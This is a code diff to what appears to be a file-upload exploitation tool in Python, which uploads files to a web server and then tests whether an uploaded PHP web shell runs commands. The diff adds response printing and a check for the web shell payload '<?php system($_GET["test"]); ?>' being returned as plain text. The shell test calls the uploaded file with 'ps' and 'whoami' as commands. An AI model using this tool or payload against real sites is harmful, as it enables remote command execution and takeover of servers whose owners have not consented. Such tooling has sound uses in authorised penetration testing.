@@ -165,6 +165,9 @@ def GET(url):
 
     response = requests.get(url, timeout=timeout_seconds)
     
+    if (options.print_response): debug(response.status_code, 3)
+    if (options.print_response): debug(response.status_code, 3)
+    if (options.print_response): print(response.text)
     return response
 
 def generate_random_string(length):
@@ -242,11 +245,14 @@ def check_success(response):
     if (options.false_regex != False):
         return not bool(re.search(options.false_regex, response.text))
 
-def check_shell(url):
+def check_shell(url, more_info=False):
     response = GET(url + "?test=ps")
     if ("PID" in response.text and "TTY" in response.text):
         return True
     else: 
+        if (more_info):
+            if ('<?php system($_GET["test"]); ?>' in response.text):
+                return "printed_out"
         return False
 
 def upload(request_file, session, file_data, file_name, file_content_type, timeout=20):
@@ -336,14 +342,18 @@ def upload_and_validate(request_file, session, file_data, file_name, mimetype, m
     if (check_success(response)):
         if expect_interaction: success(message + "\n")
 
-        if (check_shell(upload_url + file_name) == True):
+        check_result = check_shell(upload_url + file_name)
+        if (check_result == True):
             if not expect_interaction: success(message + "\n")
             success("Shell confirmed interactable")
             exit_success(upload_url + file_name)
         else:
             if (expect_interaction):
-                debug((upload_url + file_name + "?test=whoami"), 1)
-                error("Shell does not seem to be interractable, make sure your upload directory is correct")
+                debug((upload_url + file_name + "?test=whoami"), 0)
+                if (check_result == "printed_out"):
+                    warning("Shell was printed as plain text")
+                else:
+                    warning("Shell does not seem to be interractable, make sure your upload directory is correct")
 
     failure(message, 2)
     return session
